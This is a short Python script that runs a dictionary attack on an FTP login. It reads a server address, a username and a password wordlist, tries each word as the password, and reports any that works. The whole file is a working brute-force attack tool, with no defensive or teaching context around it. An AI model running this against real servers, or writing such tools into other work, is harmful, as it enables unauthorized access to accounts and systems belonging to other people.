#!/usr/bin/python3

import ftplib

server = input("FTP Server: ")
user = input("Username: ")

passwordlist = input("Path to Password list > ")

try:
    with open(passwordlist, "r") as pw:
        for word in pw:
            word = word.strip("\r").strip("\n")
            try:
                ftp = ftplib.FTP(server)
                ftp.login(user, word)
                print(f"Success! The password is {word}")
            except:
                print("Still trying...")
except:
    print("Wordlist Error")
